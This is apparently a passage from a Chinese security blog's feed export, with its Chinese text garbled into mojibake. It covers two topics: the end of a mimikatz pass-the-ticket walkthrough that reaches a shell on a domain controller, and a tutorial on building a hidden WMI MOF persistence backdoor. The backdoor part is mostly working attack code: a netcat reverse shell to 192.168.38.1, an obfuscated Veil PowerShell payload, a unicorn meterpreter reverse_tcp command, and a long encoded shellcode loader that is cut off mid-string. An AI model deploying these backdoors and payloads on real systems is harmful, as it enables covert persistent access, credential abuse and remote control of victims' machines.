tickets1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253mimikatz # kerberos::listmimikatz # (EMPTY LIST)mimikatz # kerberos::ptt 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi 0 - File '1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi': OKmimikatz # kerberos::ptt 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi 0 - File '2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi' : OKmimikatz # kerberos::list[00000000] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;[00000001] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;mimikatz #C:\Users\notanadmin\Desktop&gt;psexec \\dc1 cmd.exePsExec v1.97 - Execute processes remotelyCopyright (C) 2001-2009 Mark RussinovichSysinternals - www.sysinternals.comMicrosoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;whoamisittingduck\uberuserC:\Windows\system32&gt;echo %COMPUTERNAME%DC1C:\Windows\system32&gt; Convert Mimikatz Kerberos ticket to CCache and use12345678910111213141516C:\Users\notanadmin\Desktop&gt;kirbikator.exe ccache "2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi" .#####. KiRBikator 1.0 (x86) release "Kiwi en C" (Feb 1 2015 03:37:29) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com (oe.eo) '#####' * * */Destination : MIT Credential Cache (simple) &lt; 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi (RFC KRB-CRED (#22)) &gt; Single file : uberuser@SITTINGDUCK.INFO.ccacheC:\Users\notanadmin\Desktop&gt; Method 1123KRB5CCNAME=uberuser@SITTINGDUCK.INFO.ccache smbclient -k //dc1.sittingduck.info/c$OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]smb: \&gt; Method 212345678910111213141516171819202122232425root@kali:~# apt-get install krb5-userReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following extra packages will be installed: krb5-config libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7Suggested packages: krb5-docThe following NEW packages will be installed: krb5-config krb5-user libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-70 upgraded, 6 newly installed, 0 to remove and 0 not upgraded.Need to get 466 kB of archives.After this operation, 1,199 kB of additional disk space will be used.Do you want to continue? [Y/n] y0% [Connecting to http.kali.org]&lt;SNIP&gt;&lt;SNIP&gt;&lt;SNIP&gt;root@kali:~/Desktop# klistklist: Credentials cache file '/tmp/krb5cc_0' not foundroot@kali:~/Desktop# cp uberuser@SITTINGDUCK.INFO.ccache /tmp/krb5cc_0root@kali:~/Desktop# smbclient -k //dc1.sittingduck.info/c$OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]smb: \&gt;]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powershellä¹‹MOFåé—¨]]></title>
    <url>%2Farchives%2FPowershell_MOF_Backdoor.html</url>
    <content type="text"><![CDATA[0x00 MOFManaged Object Format (MOF)æ˜¯WMIæ•°æ®åº“ä¸­ç±»å’Œç±»å®ä¾‹çš„åŸå§‹ä¿å­˜å½¢å¼ã€‚å…·ä½“ä»‹ç»å¯ä»¥é˜…è¯»ã€ŠWMI çš„æ”»å‡»ï¼Œé˜²å¾¡ä¸å–è¯åˆ†ææŠ€æœ¯ä¹‹é˜²å¾¡ç¯‡ã€‹ï¼ŒWindows ç®¡ç†è§„èŒƒ (WMI) æä¾›äº†ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ç¼–è¯‘åˆ°WMIå­˜å‚¨åº“çš„æ‰˜ç®¡å¯¹è±¡æ ¼å¼ (MOF) æ–‡ä»¶ï¼š æ–¹æ³• 1ï¼š ä½¿ç”¨Mofcomp.exeã€‚ æ–¹æ³• 2ï¼š ä½¿ç”¨ IMofCompiler æ¥å£å’Œ $ CompileFile æ–¹æ³•ã€‚ æ–¹æ³• 3ï¼š æ‹–æ”¾åˆ°%SystemRoot%\System32\Wbem\MOFæ–‡ä»¶å¤¹çš„ MOF æ–‡ä»¶ã€‚ ç¬¬ä¸‰ç§æ–¹æ³•ä»…ä¸ºå‘åå…¼å®¹æ€§ä¸æ—©æœŸç‰ˆæœ¬ï¼ˆwin2003ï¼‰çš„ WMI æä¾›ã€‚ ä¸€ä¸ªç®€å•çš„MOFåå¼¹shellç¤ºä¾‹ï¼š123456789101112131415161718192021222324252627#pragma namespace ("\\\\.\\root\\subscription")instance of __EventFilter as $FILTER&#123; Name = "CLASS_FIRST_TEST"; EventNamespace = "root\\cimv2"; Query = "SELECT * FROM __InstanceCreationEvent " "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND " "TargetInstance.LogFile=\"Application\""; QueryLanguage = "WQL";&#125;;instance of ActiveScriptEventConsumer as $CONSUMER&#123; Name = "CLASS_FIRST_TEST"; ScriptingEngine = "VBScript"; ScriptText = "Set objShell = CreateObject(\"WScript.Shell\")\n" "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 192.168.38.1 1337 -e C:\\Windows\\system32\\cmd.exe\"\n";&#125;;instance of __FilterToConsumerBinding&#123; Consumer = $CONSUMER ; Filter = $FILTER ;&#125;; 0x01 MOF and Powershellå¦‚æœè·å–äº†ç®¡ç†å‘˜æƒé™ï¼Œä½¿ç”¨MOFå¯ä»¥åšä¸€ä¸ªæ°¸ä¹…çš„éšè—åé—¨ã€‚å¯¹äºå¾ˆå¤šåé—¨æ¥è¯´ï¼Œéƒ½éœ€è¦ä¸€ä¸ªè§¦å‘ï¼Œåœ¨è¿™é‡Œï¼Œå¯ä»¥ä½¿ç”¨WMI Query Language(WQL)æ¥æŸ¥è¯¢äº‹ä»¶ï¼Œä»¥ä¾¿ç¡®å®šä»€ä¹ˆæ—¶å€™è§¦å‘æˆ‘ä»¬çš„åé—¨ã€‚ï¼ˆæ›´å¤šè¯¦ç»†çš„è§£é‡Šå¯åœ¨æŸ¥çœ‹æˆ³æˆ‘ï¼Œæˆ³æˆ‘)ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬æƒ³åšä¸€ä¸ªåé—¨é€šè¿‡æ‰“å¼€notepadæ¥è§¦å‘ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š123"SELECT * FROM __InstanceCreationEvent Within 5 " "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; å¦‚æœæƒ³é€šè¿‡å…³é—­Powershellæ¥è§¦å‘ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š123"SELECT * FROM __InstanceDeletionEvent Within 5 " "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"powershell.exe\" "; å¦‚æœæƒ³é€šè¿‡æ¯å°æ—¶åœ¨30åˆ†é’Ÿçš„æ—¶å€™è§¦å‘ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š123"Select * From __InstanceModificationEvent " "Where TargetInstance Isa \"Win32_LocalTime\" " "And TargetInstance.Minute = 30 " å½“æˆ‘ä»¬ç¡®å®šäº†æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæˆ‘ä»¬çš„æŸ¥è¯¢å†™æˆä¸€ä¸ªMOFè¿‡æ»¤å™¨ï¼š1234567instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query = &lt;æ’å…¥æŸ¥è¯¢&gt; QueryLanguage = "WQL";&#125;; æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨æ‰“å¼€Notepadä½œä¸ºè§¦å‘æ¡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥è¿™æ ·å†™ï¼š123456789instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;; ä¸‹é¢æˆ‘ä»¬å°±éœ€è¦äº‹ä»¶æ¶ˆè´¹è€…çš„å“åº”äº†ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸åŒçš„EventConsumer.aspx?tduid=(c301fb77b3a8b885de2b9a1f7456c5ac)(256380)(2459594)(TnL5HPStwNw-ektmYir908cxwICjxz7cAg)())ç±»ï¼Œé€šè¿‡ä½¿ç”¨CommandLineEventConsumerï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Veilè¾“å‡ºçš„payloadï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ActiveScriptEventConsumeræ¥åµŒå…¥æˆ–è€…è°ƒç”¨VBSè„šæœ¬ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨CommandLineEventConsumerçš„ç¤ºä¾‹ï¼š1"cmd /C [data here]"; ä¸‹é¢ä½¿ç”¨Veilæ¥ç”ŸæˆPowershell payload: é€‰æ‹©x86é‡Œé¢è¿›è¡Œæµ‹è¯•ï¼Œpayloadå¦‚ä¸‹ï¼š1powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();" æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŠŠä¸Šé¢çš„payloadæ”¾åˆ°ä¸‹é¢çš„æ¨¡æ¿ä¸­ï¼š123456instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();";&#125;; è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹å°±æ˜¯å¦‚æœpayloadé‡Œé¢å­˜åœ¨éœ€è¦è½¬ä¹‰çš„&quot;ä»¥åŠ\ è¿™é‡Œå¯ä»¥ä½¿ç”¨åŒå¼•å·å°†å…¶å¼•ç”¨å¹¶ç”¨\è¿›è¡Œè½¬ä¹‰ã€‚ æœ€åæˆ‘ä»¬æ‰€å†™çš„MOFæ–‡ä»¶æ˜¯è¿™æ ·çš„ï¼š1234567891011121314151617181920212223242526272829303132#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden" " -Exec Bypass -Command \"Invoke-Expression " "$(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String" "(\\\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5" "UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/" "Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13" "URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/" "JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/" "ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/" "RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\\\")))), " "[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding &#123; Filter = $Filt; Consumer = $Cons;&#125;; å¦‚æœè§‰å¾—éº»çƒ¦çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·unicornæ¥ç”Ÿæˆæ²¡æœ‰ç‰¹æ®Šå­—ç¬¦çš„payloadï¼Œä½¿ç”¨æ–¹å¼å¾ˆç®€å•:1â˜ unicorn [master] python unicorn.py windows/meterpreter/reverse_tcp 192.168.74.141 8889 å°†powershell_attack.txtçš„å†…å®¹å¤åˆ¶è¿›æ¥ï¼Œç„¶åmsfconsole -r unicorn.rc åˆ™å¯å¼€å¯ç›‘å¬,ä¿®æ”¹åçš„MOFæ–‡ä»¶å¦‚ä¸‹ï¼š12345678910111213141516171819202122#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell -window hidden -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMANAAsADAAeABiAGEALAAwAHgAYQBlACwAMAB4AGUAZAAsADAAeABmADMALAAwAHgANgA0ACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGYALAAwAHgAMgBiACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADcALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADcALAAwAHgAMAA0ACwAMAB4ADAAMwAsADAAeAA1ADcALAAwAHgAYgBhACwAMAB4ADAAZgAsADAAeAAwADYALAAwAHgAOQA4ACwAMAB4ADIAYQAsADAAeAA0AGQALAAwAHgAZQA5ACwAMAB4ADYAMQAsADAAeABhAGEALAAwAHgAMwAyACwAMAB4ADYAMwAsADAAeAA4ADQALAAwAHgAOQBiACwAMAB4ADcAMgAsADAAeAAxADcALAAwAHgAYwBjACwAMAB4ADgAYgAsADAAeAA0ADIALAAwAHgANQAzACwAMAB4ADgAMAAsADAAeAAyADcALAAwAHgAMgA4ACwAMAB4ADMAMQAsADAAeAAzADEALAAwAHgAYgBjACwAMAB4ADUAYwAsADAAeAA5AGUALAAwAHgAMwA2ACwAMAB4ADcANQAsADAAeABlAGEALAAwAHgAZgA4ACwAMAB4ADcAOQAsADAAeAA4ADYALAAwAHgANAA3ACwAMAB4ADMAOAAsADAAeAAxAGIALAAwAHgAMAA0ACwAMAB4ADkAYQAsADAAeAA2AGQALAAwAHgAZgBiACwAMAB4ADMANQAsADAAeAA1ADUALAAwAHgANgAwACwAMAB4AGYAYQAsADAAeAA3ADIALAAwAHgAOAA4ACwAMAB4ADgAOQAsADAAeABhAGUALAAwAHgAMgBiACwAMAB4AGMANgAsADAAeAAzAGMALAAwAHgANQBmACwAMAB4ADUAOAAsADAAeAA5ADIALAAwAHgAZgBjACwAMAB4AGQANAAsADAAeAAxADIALAAwAHgAMwAyACwAMAB4ADgANQAsADAAeAAwADkALAAwAHgAZQAyACwAMAB4ADMANQAsADAAeABhADQALAAwAHgAOQBmACwAMAB4ADcAOQAsADAAeAA2AGMALAAwAHgANgA2ACwAMAB4ADIAMQAsADAAeABhAGUALAAwAHgAMAA0ACwAMAB4ADIAZgAsADAAeAAzADkALAAwAHgAYgAzACwAMAB4ADIAMQAsADAAeABmADkALAAwAHgAYgAyACwAMAB4ADAANwAsADAAeABkAGQALAAwAHgAZgA4ACwAMAB4ADEAMgAsADAAeAA1ADYALAAwAHgAMQBlACwAMAB4ADUANgAsADAAeAA1AGIALAAwAHgANQA3ACwAMAB4AGUAZAAsADAAeABhADYALAAwAHgAOQBiACwAMAB4ADUAZgAsADAAeAAwAGUALAAwAHgAZABkACwAMAB4AGQANQAsADAAeAA5AGMALAAwAHgAYgAzACwAMAB4AGUANgAsADAAeAAyADEALAAwAHgAZABmACwAMAB4ADYAZgAsADAAeAA2ADIALAAwAHgAYgAyACwAMAB4ADQANwAsADAAeABmAGIALAAwAHgAZAA0ACwAMAB4ADEAZQAsADAAeAA3ADYALAAwAHgAMgA4ACwAMAB4ADgAMgAsADAAeABkADUALAAwAHgANwA0ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgAYgAyACwAMAB4ADkAOAAsADAAeAAxADgALAAwAHgAMAA0ACwAMAB4AGMAOQAsADAAeABhADQALAAwAHgAOQAxACwAMAB4AGEAYgAsADAAeAAxAGUALAAwAHgAMgBkACwAMAB4AGUAMQAsADAAeAA4AGYALAAwAHgAYgBhACwAMAB4ADcANgAsADAAeABiADEALAAwAHgAYQBlACwAMAB4ADkAYgAsADAAeABkADIALAAwAHgAMQA0ACwAMAB4AGMAZQAsADAAeABmAGMALAAwAHgAYgBkACwAMAB4AGMAOQAsADAAeAA2AGEALAAwAHgANwA2ACwAMAB4ADUAMwAsADAAeAAxAGQALAAwAHgAMAA3ACwAMAB4AGQANQAsADAAeAAzAGIALAAwAHgAZAAyACwAMAB4ADIAYQAsADAAeABlADYALAAwAHgAYgBiACwAMAB4ADcAYwAsADAAeAAzAGMALAAwAHgAOQA1ACwAMAB4ADgAOQAsADAAeAAyADMALAAwAHgAOQA2ACwAMAB4ADMAMQAsADAAeABhADEALAAwAHgAYQBjACwAMAB4ADMAMAAsADAAeABjADUALAAwAHgAYwA2ACwAMAB4ADgANgAsADAAeAA4ADUALAAwAHgANQA5ACwAMAB4ADMAOQAsADAAeAAyADkALAAwAHgAZgA2ACwAMAB4ADcAMAAsADAAeABmAGQALAAwAHgANwBkACwAMAB4AGEANgAsADAAeABlAGEALAAwAHgAZAA0ACwAMAB4AGYAZAAsADAAeAAyAGQALAAwAHgAZQBiACwAMAB4AGQAOQAsADAAeAAyAGIALAAwAHgAZABiACwAMAB4AGUAZQAsADAAeAA0AGQALAAwAHgAMQA0ACwAMAB4AGIANAAsADAAeABiAGIALAAwAHgAMAAwACwAMAB4AGYAYwAsADAAeABjADcALAAwAHgAMwBiACwAMAB4ADMAOAAsADAAeAA0ADQALAAwAHgANABlACwAMAB4AGQAZAAsADAAeAA2AGMALAAwAHgAZQA2ACwAMAB4ADAAMQAsADAAeAA3ADIALAAwAHgAYwBjACwAMAB4ADUANgAsADAAeABlADIALAAwAHgAMgAyACwAMAB4AGEANAAsADAAeABiAGMALAAwAHgAZQBkACwAMAB4ADEAZAAsADAAeABkADQALAAwAHgAYgBlACwAMAB4ADIANwAsADAAeAAzADYALAAwAHgANwBlACwAMAB4ADUAMQAsADAAeAA5AGUALAAwAHgANgBlACwAMAB4ADEANgAsADAAeABjADgALAAwAHgAYgBiACwAMAB4AGUANQAsADAAeAA4ADcALAAwAHgAMQA1ACwAMAB4ADEANgAsADAAeAA4ADAALAAwAHgAOAA3ACwAMAB4ADkAZQAsADAAeAA5ADUALAAwAHgANwA0ACwAMAB4ADQAOQAsADAAeAA1ADcALAAwAHgAZAAzACwAMAB4ADYANgAsADAAeAAzAGQALAAwAHgAOQA3ACwAMAB4AGEAZQAsADAAeABkADUALAAwAHgAZQBiACwAMAB4AGEAOAAsADAAeAAwADQALAAwAHgANwAzACwAMAB4ADEAMwAsADAAeAAzAGQALAAwAHgAYQAzACwAMAB4AGQAMgAsADAAeAA0ADQALAAwAHgAYQA5ACwAMAB4AGEAOQAsADAAeAAwADMALAAwAHgAYQAyACwAMAB4ADcANgAsADAAeAA1ADEALAAwAHgANgA2ACwAMAB4AGIAOQAsADAAeABiAGYALAAwAHgAYwA3ACwAMAB4AGMAOQAsADAAeABkADUALAAwAHgAYgBmACwAMAB4ADAANwAsADAAeABjAGEALAAwAHgAMgA1ACwAMAB4ADkANgAsADAAeAA0AGQALAAwAHgAYwBhACwAMAB4ADQAZAAsADAAeAA0AGUALAAwAHgAMwA2ACwAMAB4ADkAOQAsADAAeAA2ADgALAAwAHgAOQAxACwAMAB4AGUAMwAsADAAeAA4AGQALAAwAHgAMgAxACwAMAB4ADAANAAsADAAeAAwAGMALAAwAHgAZQA0ACwAMAB4ADkANgAsADAAeAA4AGYALAAwAHgANgA0ACwAMAB4ADAAYQAsADAAeABjADEALAAwAHgAZgA4ACwAMAB4ADIAYQAsADAAeABmADUALAAwAHgAMgA0ACwAMAB4AGYAOQAsADAAeAAxADcALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAA4AGYALAAwAHgANwA5ACwAMAB4AGYAMAA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkA